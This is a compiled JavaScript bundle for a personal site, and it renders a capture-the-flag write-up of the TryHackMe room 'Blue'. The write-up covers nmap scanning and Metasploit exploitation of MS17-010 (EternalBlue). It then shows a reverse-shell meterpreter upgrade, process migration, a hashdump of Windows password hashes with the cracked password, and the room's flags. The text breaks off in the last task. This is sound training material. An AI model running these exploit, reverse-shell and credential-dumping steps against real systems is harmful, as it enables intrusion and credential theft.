"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2524],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var o=n(67294);function s(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);t&&(o=o.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,o)}return n}function r(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){s(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,o,s=function(e,t){if(null==e)return{};var n,o,s={},a=Object.keys(e);for(o=0;o<a.length;o++)n=a[o],t.indexOf(n)>=0||(s[n]=e[n]);return s}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(o=0;o<a.length;o++)n=a[o],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}var l=o.createContext({}),c=function(e){var t=o.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):r(r({},t),e)),n},p=function(e){var t=c(e.components);return o.createElement(l.Provider,{value:t},e.children)},m="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return o.createElement(o.Fragment,{},t)}},u=o.forwardRef((function(e,t){var n=e.components,s=e.mdxType,a=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),m=c(n),u=s,h=m["".concat(l,".").concat(u)]||m[u]||d[u]||a;return n?o.createElement(h,r(r({ref:t},p),{},{components:n})):o.createElement(h,r({ref:t},p))}));function h(e,t){var n=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var a=n.length,r=new Array(a);r[0]=u;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[m]="string"==typeof e?e:s,r[1]=i;for(var c=2;c<a;c++)r[c]=n[c];return o.createElement.apply(null,r)}return o.createElement.apply(null,n)}u.displayName="MDXCreateElement"},29353:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>r,default:()=>d,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var o=n(87462),s=(n(67294),n(3905));const a={},r="Blue",i={unversionedId:"Tryhackme/Blue/Blue",id:"Tryhackme/Blue/Blue",title:"Blue",description:"Deploy & hack into a Windows machine, leveraging common misconfigurations issues.",source:"@site/writeups/Tryhackme/Blue/Blue.md",sourceDirName:"Tryhackme/Blue",slug:"/Tryhackme/Blue/",permalink:"/writeups/Tryhackme/Blue/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Blog",permalink:"/writeups/Tryhackme/Blog/"},next:{title:"Blueprint",permalink:"/writeups/Tryhackme/Blueprint/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Recon",id:"task-1-recon",level:2},{value:"Task 2 Gain Access",id:"task-2-gain-access",level:2},{value:"Task 3 Escalate",id:"task-3-escalate",level:2},{value:"Task 4 Cracking",id:"task-4-cracking",level:2},{value:"Task 5 Find flags!",id:"task-5-find-flags",level:2}],p={toc:c},m="wrapper";function d(e){let{components:t,...n}=e;return(0,s.kt)(m,(0,o.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"blue"},"Blue"),(0,s.kt)("p",null,"Deploy & hack into a Windows machine, leveraging common misconfigurations issues."),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/blue"},"Blue")),(0,s.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Metasploit (MS17-010)"),(0,s.kt)("li",{parentName:"ul"},"Metasploit (hashdump)"),(0,s.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"task-1-recon"},"[Task 1]"," Recon"),(0,s.kt)("p",null,"Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. ",(0,s.kt)("strong",{parentName:"p"},"This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused. ")),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://i.imgur.com/NhZIt9S.png",alt:"Ethernal Blue"})),(0,s.kt)("p",null,(0,s.kt)("em",{parentName:"p"},"Art by one of our members, Varg - ",(0,s.kt)("a",{parentName:"em",href:"https://tryhackme.com/p/Varg"},"THM Profile")," - ",(0,s.kt)("a",{parentName:"em",href:"https://www.instagram.com/varghalladesign/"},"Instagram")," - ",(0,s.kt)("a",{parentName:"em",href:"https://www.redbubble.com/shop/ap/53637482"},"Blue Merch"))),(0,s.kt)("p",null,(0,s.kt)("em",{parentName:"p"},"Link to Ice, the sequel to Blue: ",(0,s.kt)("a",{parentName:"em",href:"https://tryhackme.com/room/ice"},"Link"))),(0,s.kt)("p",null,(0,s.kt)("em",{parentName:"p"},"You can check out the third box in this series, Blaster, here: ",(0,s.kt)("a",{parentName:"em",href:"https://tryhackme.com/room/blaster"},"Link"))),(0,s.kt)("hr",null),(0,s.kt)("p",null,(0,s.kt)("em",{parentName:"p"},"The virtual machine used in this room (Blue) can be downloaded for offline usage from ",(0,s.kt)("a",{parentName:"em",href:"https://darkstar7471.com/resources.html"},"https://darkstar7471.com/resources.html"))),(0,s.kt)("p",null,(0,s.kt)("em",{parentName:"p"},"Enjoy the room! For future rooms and write-ups, follow ",(0,s.kt)("a",{parentName:"em",href:"https://twitter.com/darkstar7471"},"@darkstar7471")," on Twitter.")),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Scan the machine. (If you are unsure how to tackle this, I recommend checking out the room RP: Nmap)")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"sudo nmap -sS -sC -sV -vv --script vuln blue\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 17:23 EDT\nNSE: Loaded 149 scripts for scanning.\nNSE: Script Pre-scanning.\nNSE: Starting runlevel 1 (of 2) scan.\nInitiating NSE at 17:23\nCompleted NSE at 17:23, 10.00s elapsed\nNSE: Starting runlevel 2 (of 2) scan.\nInitiating NSE at 17:23\nCompleted NSE at 17:23, 0.00s elapsed\nInitiating Ping Scan at 17:23\nScanning blue (10.10.166.97) [4 ports]\nCompleted Ping Scan at 17:23, 0.09s elapsed (1 total hosts)\nInitiating SYN Stealth Scan at 17:23\nScanning blue (10.10.166.97) [1000 ports]\nDiscovered open port 139/tcp on 10.10.166.97\nDiscovered open port 135/tcp on 10.10.166.97\nDiscovered open port 3389/tcp on 10.10.166.97\nDiscovered open port 445/tcp on 10.10.166.97\nDiscovered open port 49158/tcp on 10.10.166.97\nDiscovered open port 49154/tcp on 10.10.166.97\nDiscovered open port 49152/tcp on 10.10.166.97\nDiscovered open port 49153/tcp on 10.10.166.97\nDiscovered open port 49160/tcp on 10.10.166.97\nCompleted SYN Stealth Scan at 17:23, 0.75s elapsed (1000 total ports)\nInitiating Service scan at 17:23\nScanning 9 services on blue (10.10.166.97)\nService scan Timing: About 55.56% done; ETC: 17:25 (0:00:43 remaining)\nCompleted Service scan at 17:24, 59.35s elapsed (9 services on 1 host)\nNSE: Script scanning 10.10.166.97.\nNSE: Starting runlevel 1 (of 2) scan.\nInitiating NSE at 17:24\nNSE Timing: About 99.82% done; ETC: 17:24 (0:00:00 remaining)\nCompleted NSE at 17:25, 32.95s elapsed\nNSE: Starting runlevel 2 (of 2) scan.\nInitiating NSE at 17:25\nCompleted NSE at 17:25, 5.81s elapsed\nNmap scan report for blue (10.10.166.97)\nHost is up, received echo-reply ttl 127 (0.041s latency).\nScanned at 2020-09-14 17:23:27 EDT for 99s\nNot shown: 991 closed ports\nReason: 991 resets\nPORT      STATE SERVICE      REASON          VERSION\n135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n3389/tcp  open  tcpwrapped   syn-ack ttl 127\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n| rdp-vuln-ms12-020:\n|   VULNERABLE:\n|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2012-0152\n|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)\n|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.\n|\n|     Disclosure date: 2012-03-13\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152\n|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020\n|\n|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2012-0002\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.\n|\n|     Disclosure date: 2012-03-13\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002\n|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020\n|_sslv2-drown:\n49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\nService Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|\n|     Disclosure date: 2017-03-14\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n\nNSE: Script Post-scanning.\nNSE: Starting runlevel 1 (of 2) scan.\nInitiating NSE at 17:25\nCompleted NSE at 17:25, 0.00s elapsed\nNSE: Starting runlevel 2 (of 2) scan.\nInitiating NSE at 17:25\nCompleted NSE at 17:25, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 110.64 seconds\n           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.064KB)\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"How many ports are open with a port number under 1000?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"3")),(0,s.kt)("ol",{start:3},(0,s.kt)("li",{parentName:"ol"},"What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"ms17-010")),(0,s.kt)("h2",{id:"task-2-gain-access"},"[Task 2]"," Gain Access"),(0,s.kt)("p",null,"Exploit the machine and gain a foothold."),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Start Metasploit")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 > search ms17-010\n\nMatching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\n   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"exploit/windows/smb/ms17_010_eternalblue")),(0,s.kt)("ol",{start:3},(0,s.kt)("li",{parentName:"ol"},"Show options and set the one required value. What is the name of this value? (All caps for submission)")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 > use exploit/windows/smb/ms17_010_eternalblue\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n\n\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.166.97\nRHOSTS => 10.10.166.97\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > show options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS         10.10.166.97     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"RHOSTS")),(0,s.kt)("ol",{start:4},(0,s.kt)("li",{parentName:"ol"},"Run the exploit!")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("ol",{start:5},(0,s.kt)("li",{parentName:"ol"},"Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("h2",{id:"task-3-escalate"},"[Task 3]"," Escalate"),(0,s.kt)("p",null,"Escalate privileges, learn how to upgrade shells in metasploit."),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"post/multi/manage/shell_to_meterpreter")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 post(multi/manage/shell_to_meterpreter) > show options\n\nModule options (post/multi/manage/shell_to_meterpreter):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection\n   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).\n   LPORT    4433             yes       Port for payload to connect to.\n   SESSION                   yes       The session to run this module on.\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"SESSION")),(0,s.kt)("ol",{start:3},(0,s.kt)("li",{parentName:"ol"},"Set the required option, you may need to list all of the sessions to find your target here.")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1\nSESSION => 1\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("ol",{start:4},(0,s.kt)("li",{parentName:"ol"},"Run! If this doesn't work, try completing the exploit from the previous task once more.")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 post(multi/manage/shell_to_meterpreter) > run\n\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 10.8.106.222:4433\n[*] Post module execution completed\n[*] Sending stage (176195 bytes) to 10.10.166.97\n[*] Meterpreter session 2 opened (10.8.106.222:4433 -> 10.10.166.97:49303) at 2020-09-14 17:41:50 -0400\n[*] Stopping exploit/multi/handler\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("ol",{start:5},(0,s.kt)("li",{parentName:"ol"},"Once the meterpreter shell conversion completes, select that session for use.")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"msf5 post(multi/manage/shell_to_meterpreter) > sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                                                                       Connection\n  --  ----  ----                     -----------                                                                       ----------\n  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.106.222:4444 -> 10.10.166.97:49253 (10.10.166.97)\n  2         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ JON-PC                                                      10.8.106.222:4433 -> 10.10.166.97:49303 (10.10.166.97)\n\nmsf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2\n[*] Starting interaction with 2...\n\nmeterpreter >\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("ol",{start:6},(0,s.kt)("li",{parentName:"ol"},"Verify that we have escalated to NT AUTHORITY\\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"meterpreter > shell\nProcess 1580 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32>whoami\nwhoami\nnt authority\\system\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("ol",{start:7},(0,s.kt)("li",{parentName:"ol"},"List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id (far left column).")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"meterpreter > ps\n\nProcess List\n============\n\n PID   PPID  Name                  Arch  Session  User                          Path\n ---   ----  ----                  ----  -------  ----                          ----\n 0     0     [System Process]\n 4     0     System                x64   0\n 416   4     smss.exe              x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\smss.exe\n 544   536   csrss.exe             x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\csrss.exe\n 592   536   wininit.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\wininit.exe\n 604   584   csrss.exe             x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\csrss.exe\n 644   584   winlogon.exe          x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\winlogon.exe\n 692   592   services.exe          x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\services.exe\n 700   592   lsass.exe             x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\lsass.exe\n 708   592   lsm.exe               x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\lsm.exe\n 724   692   svchost.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 816   692   svchost.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 884   692   svchost.exe           x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\svchost.exe\n 932   692   svchost.exe           x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\LogonUI.exe\n 1020  692   svchost.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 1056  692   svchost.exe           x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 1104  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\n 1136  692   svchost.exe           x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\svchost.exe\n 1272  692   spoolsv.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\spoolsv.exe\n 1320  692   svchost.exe           x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 1408  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe\n 1464  692   LiteAgent.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\Xentools\\LiteAgent.exe\n 1572  692   svchost.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 1580  1684  cmd.exe               x86   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\SysWOW64\\cmd.exe\n 1604  692   Ec2Config.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe\n 1684  2920  powershell.exe        x86   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\n 1904  692   svchost.exe           x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\svchost.exe\n 2432  544   conhost.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\conhost.exe\n 2476  1272  cmd.exe               x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\cmd.exe\n 2532  544   conhost.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\conhost.exe\n 2576  544   conhost.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\conhost.exe\n 2596  692   svchost.exe           x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 2624  692   sppsvc.exe            x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\sppsvc.exe\n 2768  692   SearchIndexer.exe     x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\SearchIndexer.exe\n 2920  2344  powershell.exe        x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,s.kt)("ol",{start:8},(0,s.kt)("li",{parentName:"ol"},"Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"meterpreter > migrate 1272\n[*] Migrating from 1684 to 1272...\n[*] Migration completed successfully.\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"migrate 1272")),(0,s.kt)("h2",{id:"task-4-cracking"},"[Task 4]"," Cracking"),(0,s.kt)("p",null,"Dump the non-default user's password and crack it!"),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"meterpreter > hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"jon")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"Copy this password hash to a file and research how to crack it. What is the cracked password?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"alqfna22")),(0,s.kt)("h2",{id:"task-5-find-flags"},"[Task 5]"," Find flags!"),(0,s.kt)("p",null,"Find the three flags planted on this machine."),(0,s.kt)("p",null,"Completed Blue? Check out Ice: ",(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/ice"},"Link")),(0,s.kt)("p",null,"You can check out the third box in this series, Blaster, here: ",(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/blaster"},"Link")),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Flag1? (Only submit the flag contents {CONTENTS})")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"meterpreter > shell\nProcess 1888 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\nC:\\Windows\\system32>\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"C:\\Windows\\system32>type C:\\flag1.txt\ntype C:\\flag1.txt\nflag{access_the_machine}\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"access_the_machine")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"Flag2? ","*","Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"C:\\Windows\\system32>dir *flag*.txt /s\ndir *flag*.txt /s\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\Windows\\system32\\config\n\n03/17/2019  02:32 PM                34 flag2.txt\n               1 File(s)             34 bytes\n\n     Total Files Listed:\n               1 File(s)             34 bytes\n               0 Dir(s)  20,438,118,400 bytes free\n\nC:\\Windows\\system32>type config\\flag2.txt\ntype config\\flag2.txt\nflag{sam_database_elevated_access}\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"sam_database_elevated_access")),(0,s.kt)("ol",{start:3},(0,s.kt)("li",{parentName:"ol"},"flag3?")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'C:\\Windows\\system32>type C:\\"Documents and Settings"\\Jon\\Documents\\flag3.txt\ntype C:\\"Documents and 